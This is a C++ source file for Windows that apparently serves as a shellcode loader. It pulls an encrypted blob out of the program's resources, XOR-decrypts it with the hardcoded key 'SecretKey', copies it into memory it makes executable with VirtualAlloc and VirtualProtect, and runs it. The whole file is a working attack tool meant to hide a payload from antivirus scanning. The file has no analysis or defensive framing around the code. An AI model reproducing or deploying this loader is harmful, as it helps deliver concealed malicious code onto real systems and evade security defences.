#include "pch.h"
#include <windows.h>
#include "resource.h"
#include <iostream>

int main() {
	//Load shellcode from resource
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_ENCRYPTED_BIN1), L"encrypted_bin");
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);
	
	//Convert shellcode to char[]
	LPVOID pshellcode = GlobalLock(shellcodeResouceData);
	char *pshellcode_encrypt = (char*)pshellcode;
	char *shellcode_encrypt = new char[shellcodeSize];
	memcpy(shellcode_encrypt, pshellcode_encrypt, shellcodeSize);
	
	//Decrypyt shellcode with hardcoded key
	char key[] = "SecretKey";
	char *shellcode_decrypt = new char[shellcodeSize];
	int k = 0;
	for (int i = 0; i < shellcodeSize; i++)
	{
		if (k == sizeof key - 1)
			k = 0;
		shellcode_decrypt[i] = shellcode_encrypt[i] ^ key[k];
		k++;
	}
	
	//Execute shellcode
	void *exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_READWRITE);
	DWORD OldProtect = NULL;
	memcpy(exec, shellcode_decrypt, shellcodeSize);
	VirtualProtect(exec, shellcodeSize, PAGE_EXECUTE_READ, &OldProtect);
	((void(*)())exec)();

	//Clean-up memory
	VirtualFree(exec, NULL, MEM_RELEASE);
	delete[] shellcode_encrypt;
	delete[] shellcode_decrypt;
	
	return 0;
}